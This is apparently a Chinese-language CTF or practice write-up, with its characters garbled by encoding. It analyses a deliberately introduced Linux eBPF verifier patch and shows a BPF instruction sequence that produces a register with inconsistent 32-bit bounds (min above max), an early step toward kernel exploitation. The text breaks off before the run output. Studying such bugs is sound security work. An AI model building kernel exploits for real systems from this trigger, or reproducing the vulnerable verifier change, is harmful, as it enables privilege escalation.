<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG2)</span><br></pre></td></tr></table></figure>

<p>åœ¨ ALU sanitation ä¸­ï¼Œè¿™æ¡æŒ‡ä»¤çš„ä¿®è¡¥æ–¹æ³•å¦‚ä¸‹ï¼ˆBPF_REG_AX æ˜¯ä¸€ä¸ªè¾…åŠ©å¯„å­˜å™¨ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg),</span><br><span class="line">BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg),</span><br><span class="line">BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg),</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æ ‡é‡å€¼ R2 è¶…è¿‡äº† 0xe çš„ <code>alu_limit</code>ï¼Œä½†ç”±äºæŸäº›é”™è¯¯ï¼ŒéªŒè¯å™¨å¯èƒ½æ²¡æœ‰æ£€æµ‹åˆ°å®ƒã€‚ä½†æ˜¯åœ¨ ALU sanitation ä¸­æ­¤æ—¶ä¼šäº§ç”Ÿäº†ä»¥ä¸‹çš„æŒ‡ä»¤åºåˆ—ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_AX, <span class="number">0xe</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_R2),</span><br><span class="line">BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_R2),</span><br><span class="line">BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_R2),</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆï¼Œå‰ä¸¤æ¡æŒ‡ä»¤è®¡ç®—å‡º 0xe-R2ï¼Œå¦‚æœ R2 åœ¨èŒƒå›´å†…ï¼Œåˆ™ä¸ºæ­£æ•°æˆ–é›¶ï¼Œå¦‚æœè¶…å‡ºèŒƒå›´åˆ™ä¸ºè´Ÿæ•°ï¼›åœ¨ä¸‹é¢çš„ OR æŒ‡ä»¤ä¸­ï¼Œå¦‚æœ AX å’Œ R2 çš„ç¬¦å·ä¸åŒï¼Œæœ€é‡è¦çš„ç¬¦å·ä½è¢«è®¾ç½®ä¸º1ã€‚æ¢å¥è¯è¯´ï¼Œå½“ä¸€ä¸ªè¶…èŒƒå›´çš„æ“ä½œå‘ç”Ÿæ—¶ï¼Œç¬¦å·ä½åœ¨è¿™æ—¶åº”è¯¥è¢«è®¾ç½®ä¸º1ï¼›ç„¶åç”¨ NEG åè½¬ç¬¦å·ï¼Œç”¨ç®—æœ¯ç§»ä½å³ç§»64ä½ï¼ˆåƒåˆ·å­å¸¦ç€ç¬¦å·ä½ä»å·¦åˆ·åˆ°å³ï¼Œå¦‚æœ NEG åæ˜¯æ­£çš„åˆ·çš„éƒ½æ˜¯ 0ï¼Œæ˜¯è´Ÿçš„åˆ·çš„éƒ½æ˜¯ 1ï¼‰ï¼›å¦‚æœå‘ç”Ÿè¶…èŒƒå›´å¼•ç”¨ï¼ŒAX è¢«èµ‹å€¼ä¸º0ï¼Œå¦åˆ™ AX è¢«èµ‹å€¼ä¸º 0xffffffffffffffffffffffffffffï¼Œæœ€åï¼Œå– R2 å’Œ AX çš„ ANDï¼Œè¿™å°±æ˜¯æœ€ç»ˆä½¿ç”¨çš„åç§»é‡ã€‚</p>
<h1 id="è¡¥ä¸ä¸æºç åˆ†æ"><a href="#è¡¥ä¸ä¸æºç åˆ†æ" class="headerlink" title="è¡¥ä¸ä¸æºç åˆ†æ"></a>è¡¥ä¸ä¸æºç åˆ†æ</h1><p>åœ¨ä½œè€…æä¾›çš„ç»ƒä¹ é¢˜ç›®ä¸­ï¼Œä¸ºäº†åˆ©ç”¨ ebpf ç›¸å…³æ¼æ´ï¼Œäººä¸ºæ‰“äº†ä¸€ä¸ªè¡¥ä¸ï¼š</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">7957c7957,7958</span><br><span class="line">&lt;               __mark_reg32_known(dst_reg, var32_off.value);</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;               // `scalar_min_max_or` will handler the case</span><br><span class="line">&gt;               //__mark_reg32_known(dst_reg, var32_off.value);</span><br></pre></td></tr></table></figure>

<p>å¯¹ 5.18.14 ç‰ˆæœ¬ä¸­ <a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7957">kernel&#x2F;bpf&#x2F;verifier.c#7957</a> è¿›è¡Œäº†ä¿®æ”¹ã€‚</p>
<p><img src="/img/ebpf-12-10/0-1.png"></p>
<p><code>__mark_reg32_known</code> å‡½æ•°åœ¨ <code>scalar32_min_max_or</code> å‡½æ•°çš„å¼€å§‹è¢«è°ƒç”¨ï¼Œè¡¥ä¸å°†å…¶æ³¨é‡Šæ‰äº†ã€‚é‚£ä¹ˆå°±ä¸»è¦å…³å¿ƒä»–çš„ä½œç”¨ã€‚</p>
<h2 id="scalar32-min-max-or"><a href="#scalar32-min-max-or" class="headerlink" title="scalar32_min_max_or"></a>scalar32_min_max_or</h2><p>è¯¥å‡½æ•°ä»…è¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨ <code>adjust_scalar_min_max_vals</code> å‡½æ•°ä¸­ï¼š</p>
<p><img src="/img/ebpf-12-10/0-3.png"></p>
<p>æ ¹æ®æ³¨é‡Šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Calculate sign/unsigned bounds and tnum for alu32 and alu64 bit ops.</span><br><span class="line">* There are two classes of instructions: The first class we track both</span><br><span class="line">* alu32 and alu64 sign/unsigned bounds independently this provides the</span><br><span class="line">* greatest amount of precision when alu operations are mixed with jmp32</span><br><span class="line">* operations. These operations are BPF_ADD, BPF_SUB, BPF_MUL, BPF_ADD,</span><br><span class="line">* and BPF_OR. This is possible because these ops have fairly easy to</span><br><span class="line">* understand and calculate behavior in both 32-bit and 64-bit alu ops.</span><br><span class="line">* See alu32 verifier tests for examples. The second class of</span><br><span class="line">* operations, BPF_LSH, BPF_RSH, and BPF_ARSH, however are not so easy</span><br><span class="line">* with regards to tracking sign/unsigned bounds because the bits may</span><br><span class="line">* cross subreg boundaries in the alu64 case. When this happens we mark</span><br><span class="line">* the reg unbounded in the subreg bound space and use the resulting</span><br><span class="line">* tnum to calculate an approximation of the sign/unsigned bounds.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°å®ç°äº† ALU æ“ä½œåç›®æ ‡å¯„å­˜å™¨çš„èŒƒå›´è·Ÿè¸ªã€‚</p>
<p>é¦–å…ˆï¼Œç›®æ ‡å¯„å­˜å™¨ var_off è¢«æ›´æ–°ä¸º tnum_orã€‚ å®ç°æ–¹æ³•å¾ˆç®€å•ï¼šå¦‚æœè¦ OR çš„ä¸¤ä¸ªæ¯”ç‰¹éƒ½æ˜¯æœªçŸ¥çš„ï¼Œé‚£ä¹ˆç»“æœä¹Ÿæ˜¯æœªçŸ¥çš„ã€‚ å³ä½¿å…¶ä¸­ä¸€ä¸ªä½æ˜¯æœªçŸ¥çš„ï¼Œæ©ç ä¸­çš„ç›¸åº”ä½ä¹Ÿä¼šè¢«è®¾ç½®ä¸º0ï¼Œå› ä¸ºå¦‚æœå¦ä¸€ä¸ªä½æ˜¯1çš„è¯ï¼ŒOR çš„ç»“æœæ€»æ˜¯1ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TNUM(_v, _m)	(struct tnum)&#123;.value = _v, .mask = _m&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> tnum <span class="title function_">tnum_or</span><span class="params">(<span class="keyword">struct</span> tnum a, <span class="keyword">struct</span> tnum b)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 v, mu;</span><br><span class="line"></span><br><span class="line">	v = a.value | b.value;</span><br><span class="line">	mu = a.mask | b.mask;</span><br><span class="line">	<span class="keyword">return</span> TNUM(v, mu &amp; ~v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼Œå°† (mask&#x3D;0xffff0000; value&#x3D;0x1001) å’Œ (mask&#x3D;0xffffff00; value&#x3D;0x2) è¿›è¡ŒORï¼Œç»“æœæ˜¯ (mask&#x3D;0xffffef00; value&#x3D;0x1003)ã€‚</p>
<p>ä¸€æ—¦ var_off è¢«æ›´æ–°ï¼Œæœ‰å…³çš„æ ‡é‡ <code>scalar32_min_max_or</code> å°±è¢«è°ƒç”¨ã€‚ å½“ src_known å’Œ dst_known ä¸ºçœŸæ—¶ï¼Œå°†è¾¾åˆ° patch ä¸­çš„åˆ é™¤éƒ¨åˆ†ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">    <span class="comment">// `scalar_min_max_or` will handler the case</span></span><br><span class="line">    <span class="comment">//__mark_reg32_known(dst_reg, var32_off.value);</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tnum_subreg_is_const</code> å½“å¯„å­˜å™¨çš„ä½32ä½éƒ¨åˆ†æ˜¯å¸¸æ•°æ—¶ï¼Œè¿”å› trueã€‚ <strong>æ¢å¥è¯è¯´ï¼Œ<code>__mark_reg32_known</code> åŸæœ¬åº”è¯¥åœ¨ä¸¤ä¸ªè¦è¢« OR çš„å¯„å­˜å™¨çš„ä½ 32 ä½éƒ½æ˜¯å¸¸æ•°æ—¶è¢«è°ƒç”¨ã€‚</strong></p>
<p><code>__mark_reg32_known</code> ä½¿ç”¨å¸¸æ•° var_off æ›´æ–° <code>s32_min_value</code>,  <code>s32_max_value</code>,  <code>u32_min_value</code> å’Œ <code>u32_max_value</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg32_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const_subreg(reg-&gt;var_off, imm);</span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>patch çš„æ³¨é‡Šä¸­æåˆ°<code>scalar_min_max_or</code> will handler the caseï¼Œé‚£å°±çœ‹ä¸€ä¸‹è¯¥å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar_min_max_or</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">		__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™åŸºæœ¬ä¸Šå°±æ˜¯ä¸€ä¸ª 64 ä½ç‰ˆæœ¬çš„ <code>scalar32_min_max_or</code>ã€‚è¿™é‡Œå½“ä¸¤ä¸ª 64 ä½çš„å€¼éƒ½æ˜¯å¸¸æ•°æ—¶ï¼Œ<code>__mark_reg_known</code> è¢«è°ƒç”¨ã€‚<code>__mark_reg_known</code> é™¤äº† 64 ä½çš„éƒ¨åˆ†å¤–ï¼Œè¿˜å°† 32 ä½çš„èŒƒå›´æ”¹ä¸ºå¸¸æ•°ï¼ˆæ³¨æ„å¼€å¤´çš„ä¸‹åˆ’çº¿ä¸ªæ•°ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> ___mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">	reg-&gt;smin_value = (s64)imm;</span><br><span class="line">	reg-&gt;smax_value = (s64)imm;</span><br><span class="line">	reg-&gt;umin_value = imm;</span><br><span class="line">	reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line">	<span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">	       offsetof(<span class="keyword">struct</span> bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">	___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¢å¥è¯è¯´ï¼Œ<strong>å¦‚æœæ‰§è¡Œ OR è¿ç®—çš„ä¸¤ä¸ª 64 ä½å¯„å­˜å™¨éƒ½æ˜¯å¸¸æ•°ï¼Œå°±ä¸éœ€è¦åœ¨ <code>scalar32_min_max_or</code> ä¸­è°ƒç”¨<code>__mark_reg32_known</code>ï¼Œéšåçš„ <code>scalar_min_max_or</code> ä¼šä½¿å®ƒä»¬æˆä¸ºå¸¸æ•°ï¼Œä¸ä¼šæœ‰é—®é¢˜ã€‚</strong></p>
<p>é‚£ä¹ˆï¼Œå¦‚æœä¸€ä¸ª 64 ä½å¯„å­˜å™¨çš„ä½ 32 ä½æ˜¯å¸¸æ•°ï¼Œè€Œå‰ 32 ä½ä¸æ˜¯æ’å®šçš„å‘¢ï¼Ÿ<code> scalar32_min_max_or</code> ç«‹å³è¿”å›ï¼ˆå› ä¸ºä»–åªæ£€æµ‹ä½ 32 ä½ï¼Œéƒ½æ˜¯å¸¸æ•°å°±æ‰§è¡Œåˆ° patch å¤„ï¼Œè€Œç”±äº patch ååªæœ‰ return äº†æ‰€ä»¥ç›´æ¥è¿”å›ï¼‰ã€‚è€Œ <code>__mark_reg_known</code> åœ¨ <code>scalar_min_max_or</code> ä¸­è‚¯å®šä¸ä¼šè¢«è°ƒç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šåœ¨ <code>scalar_min_max_or</code> ç»§ç»­æ‰§è¡Œï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We get our maximum from the var_off, and our minimum is the</span></span><br><span class="line"><span class="comment"> * maximum of the operands&#x27; minima</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = max(dst_reg-&gt;umin_value, umin_val);</span><br><span class="line">dst_reg-&gt;umax_value = dst_reg-&gt;var_off.value | dst_reg-&gt;var_off.mask;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">	 * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">	dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">	 * cast result into s64.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">	dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br></pre></td></tr></table></figure>

<p>åœ¨æ›´æ–° <code>umin_value</code>,  <code>umax_value</code>,  <code>smin_value</code> å’Œ <code>smax_value</code> ä¹‹åï¼Œè°ƒç”¨ <code>__update_reg_bounds</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	__update_reg32_bounds(reg);</span><br><span class="line">	__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹Ÿå¯¹ 32 ä½å’Œ 64 ä½çš„èŒƒå›´è¿›è¡Œäº†æ›´æ–°ã€‚ é‚£ä¹ˆï¼Œè¿™ä¸ªè¡¥ä¸æ˜¯å¦åªæ˜¯åˆ é™¤äº†ä¸å¿…è¦çš„å¤„ç†ï¼Ÿ</p>
<h2 id="update-reg32-bounds"><a href="#update-reg32-bounds" class="headerlink" title="__update_reg32_bounds"></a>__update_reg32_bounds</h2><p>ä»”ç»†çœ‹ä¸€ä¸‹ <a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L1298"><code>__update_reg32_bounds</code></a> æµç¨‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> max_t(type, x, y)	max((type)x, (type)y)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg32_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;s32_min_value = <span class="type">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;s32_max_value = <span class="type">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">	reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">	reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">				 (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†å›çœ‹ä¸€ä¸‹ patch çš„ç‚¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">    dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">    scalar32_min_max_or(dst_reg, &amp;src_reg);		<span class="comment">//	==&gt; patch: no __mark_reg32_known !</span></span><br><span class="line">    scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šé¢ä¸€æ ·ï¼Œå‡è®¾æ­¤æ—¶å¤„ç†çš„ OR çš„ä¸¤ä¸ªæ“ä½œå¯„å­˜å™¨éƒ½æ˜¯ 64 ä½ã€‚<strong>ç”±äº <code>__mark_reg32_known</code> åœ¨ <code> scalar32_min_max_or</code> æ²¡æœ‰è¢«è°ƒç”¨ï¼Œ32ä½çš„ minï¼Œmax ä»ç„¶æ˜¯æ—§çŠ¶æ€ã€‚ è¿™æ˜¯å¦å¯ä»¥ç”¨æ¥å¯¼è‡´æœ€å°ã€æœ€å¤§çš„ä¸ä¸€è‡´è¢«æ›´æ–°ï¼Ÿ</strong> ä¸ºäº†ç®€å•èµ·è§ï¼Œå…ˆè€ƒè™‘æ— ç¬¦å·çš„æƒ…å†µï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">			 (u32)(var32_off.value | var32_off.mask));</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œå¯„å­˜å™¨çš„ä½ 32 ä½å¯¹äº src å’Œ dst éƒ½æ˜¯å®šå€¼ã€‚ å› æ­¤ï¼Œ<code>var32_off.mask</code> ä¸º 0ï¼Œå¯ä»¥æ”¹å†™ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(reg-&gt;u32_min_value, var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value, var32_off.value);</span><br></pre></td></tr></table></figure>

<p><code>u32_min_value</code> å’Œ <code>u32_max_value</code> ç»§æ‰¿äº†ç›®æ ‡å¯„å­˜å™¨çš„åŸå§‹çŠ¶æ€ã€‚ä¸‹é¢çš„ 32 ä½å¿…é¡»æ˜¯å¸¸æ•°ï¼Œæ‰€ä»¥å‡è®¾åŸæ¥çš„<code>u32_min_value</code> å’Œ <code>u32_max_value</code> éƒ½æ˜¯ Xï¼ˆèŒƒå›´ [x,x] å³å¸¸æ•° xï¼‰ã€‚ æ­¤æ—¶æŸä¸ªå¸¸æ•° Y ä¸ä¹‹æˆ–ï¼Œç»“æœæ˜¯ X|Yã€‚ é‚£ä¹ˆï¼Œå¦‚æœ X|Y &gt; Xï¼Œé‚£ä¹ˆï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(X, X|Y); <span class="comment">// min=X|Y</span></span><br><span class="line">reg-&gt;u32_max_value = min(X, X|Y); <span class="comment">// max=X</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ <code>u32_min_value</code> å¤§äº <code>u32_max_value</code> ï¼Œå‡ºç°ä¸ä¸€è‡´ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="æ¼æ´å†ç°"><a href="#æ¼æ´å†ç°" class="headerlink" title="æ¼æ´å†ç°"></a>æ¼æ´å†ç°</h2><p>ä¸ºäº†ç®€å•èµ·è§ï¼Œå‡è®¾ X&#x3D;0ï¼ŒY&#x3D;1ï¼ˆåˆ†åˆ«ä¸º R1ï¼ŒR2 çš„ä½ä½ï¼‰ã€‚é¦–å…ˆï¼Œå‡†å¤‡ä»¥ä¸‹å¯„å­˜å™¨R1å’ŒR2ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">R1: var_off=(value=<span class="number">0</span>; mask=<span class="number">0xffffffff00000000</span>)</span><br><span class="line">R2: var_off=(value=<span class="number">0xfffffffe00000001</span>; mask=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>è®©æˆ‘ä»¬çœ‹çœ‹ä¸ BPF_OR(R1, R2) è¿›è¡Œ OR æ—¶çš„å˜åŒ–ã€‚</p>
<ol>
<li>var_off&#x3D;(value&#x3D;0xfffffffe00000001; mask&#x3D;0x100000000)	(è®¡ç®—æ–¹å¼åœ¨ä¸Šé¢ tnum_or)</li>
<li>u32_min_value &#x3D; max(0, 1) &#x3D; 1</li>
<li>u32_max_value &#x3D; min(0, 1) &#x3D; 0</li>
</ol>
<p>è¿™å°±åœ¨ 32 ä½éƒ¨åˆ†åˆ›å»ºäº†ä¸€ä¸ªæœ€å°å€¼ä¸º1ã€æœ€å¤§å€¼ä¸º0çš„å±é™©çš„å¯„å­˜å™¨ã€‚ è®©æˆ‘ä»¬åœ¨å®é™…ä»£ç ä¸­æ£€æŸ¥ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xFFFFFFFE</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸ä¸­è·‘èµ·è¯¥ç¨‹åºå¹¶æ‰“å°è¾“å‡ºï¼š</p>
<blockquote>
<p>ä¸‹è½½ååœ¨ ubuntu20.04 ä¸­ç›´æ¥ run.sh èµ·ä¸æ¥ï¼Œæœç´¢äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†<a href="https://www.cnblogs.com/Rainingday/p/12483773.html">è§£å†³åŠæ³•</a>ï¼Œok</p>
</blockquote>
